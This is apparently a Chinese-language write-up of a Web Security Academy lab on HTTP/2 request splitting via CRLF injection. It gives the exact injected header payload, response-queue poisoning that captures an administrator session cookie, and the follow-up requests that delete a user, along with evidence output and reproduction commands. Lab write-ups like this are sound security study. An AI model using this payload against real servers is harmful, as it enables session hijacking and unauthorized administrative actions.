---
title: "lab-request-smuggling-h2-request-splitting-via-crlf-injection"
links:
  - target: h2-smuggling-family
    relation: evidences
---

# lab-request-smuggling-h2-request-splitting-via-crlf-injection

> evidences: [[h2-smuggling-family]]

- 题面:HTTP/2 request splitting via CRLF injection(/web-security/request-smuggling/advanced/lab-request-smuggling-h2-request-splitting-via-crlf-injection)
- 实例:https://0aac00180496d3f18025fd7800b7000d.web-security-academy.net
- 判定目标:用响应队列投毒进 `/admin` 删 carlos;状态:**solved**

## 关键步

1. 前端 h2→h1 降级,header **value** 内 CRLF 未被净化 → 可在后端拆成两个 h1 请求。
2. 分裂帧:
   `h2_req <inst> --method GET --path / --header 'foo:bar\r\nHost: <inst>\r\n\r\nGET /admin HTTP/1.1'`
   后端:第一条 `GET /`(回我们);残留 `GET /admin`(由前端补 Host)在后端连接上执行,
   其响应进响应队列。
3. 响应队列投毒:紧跟一个普通请求(新连接即可,前端复用同一后端连接),收到的
   **不是自己的响应**而是管理员那条:
   `302 Location: /my-account?id=administrator` + `Set-Cookie: session=<ADMIN>`。
4. 用抓到的 session 直接 h1 打:`GET /admin` → 200 管理员面板(`carlos - Delete`);
   `GET /admin/delete?username=carlos` → 302;solved_check true。

## 证据摘录

```
h2_req <inst> --method GET --path / --header 'foo:bar\r\nHost: <inst>\r\n\r\nGET /admin HTTP/1.1'  -> 200 (外层/)
h2_req <inst> --path /      -> 302 Location: /my-account?id=administrator  + Set-Cookie session=KoqSN7Mu8akS07aVQIRKGyTn3IVK2P4B
lab_http get <inst>/admin --jar <该session>                 -> 200 "Users ... carlos - Delete"
lab_http get <inst>/admin/delete?username=carlos --jar ...  -> 302 /admin
solved_check -> {"solved":true}
```

## 复现命令

```
lab_launch launch D8E66F883C0EFDD6CD4CCBBF6A654382ED2D13D5277BAB587AA37904D5EC4211 --widget-source /web-security/request-smuggling --jar <jar>
h2_req "https://<inst>" --method GET --path / --header 'foo:bar\r\nHost: <inst>\r\n\r\nGET /admin HTTP/1.1' --read-ms 2000 --quiet
h2_req "https://<inst>" --path / --quiet        # 读出被投毒的管理员响应,取其 Set-Cookie
lab_http get "https://<inst>/admin" --jar <jar含该session>
lab_http get "https://<inst>/admin/delete?username=carlos" --jar <jar含该session>
solved_check "https://<inst>/" --jar <jar>
```
